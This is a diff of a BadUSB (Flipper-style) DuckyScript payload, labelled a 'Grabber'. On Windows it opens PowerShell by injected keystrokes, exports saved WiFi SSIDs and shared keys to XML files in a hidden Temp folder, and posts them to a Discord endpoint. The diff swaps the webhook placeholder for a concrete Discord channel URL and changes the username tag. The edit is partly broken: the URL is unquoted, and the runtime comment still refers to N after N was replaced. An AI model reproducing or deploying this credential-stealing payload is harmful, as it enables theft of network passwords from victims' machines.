@@ -5,14 +5,14 @@ REM Target:  Windows 7/8/10/11
 REM Category: Grabber
 REM Inspiration: https://github.com/UberGuidoZ/Flipper/blob/main/BadUSB/Wifi-Stealer_Discord.txt
 REM Description: Extracts the SSID and wifi shared keys to xml files and send it to discord webhook.
-REM Runtime: (468 * N) + ((220 * N + 500ms) * (# Of WiFi Networks)). Where N is the input duration of each character
+REM Runtime: (468 * 500) + ((220 * 500 + 500ms) * (# Of WiFi Networks)). Where N is the input duration of each character
 GUI r
 DELAY 500
 ALTSTRING powershell
 ENTER
 DELAY 2000
 REM Save the Discord Webhook Endpoint in an variable.
-ALTSTRING $webhookUri = 'https://discord.com/api/webhooks/<your_webhook_info>'
+ALTSTRING $webhookUri = https://discord.com/channels/1194508070047453204/1194508070588526655
 ENTER
 REM Creating a new folder in Temp with random name to store the xml files.
 ALTSTRING New-Item -Path $env:temp -Name "476F6F6420426F7921" -ItemType "directory"
@@ -37,7 +37,7 @@ ENTER
 REM Create a body for the endpoint request.
 ALTSTRING $Body = @{
 ENTER
-ALTSTRING 'username' = '{Type:"Doggo", Nametag:"Haxor"}'
+ALTSTRING 'username' = '{Type:"Doggo", Nametag:"arno"}'
 ENTER
 ALTSTRING 'content' = '```xml'  + "`n" + $fileContent + '```'
 ENTER
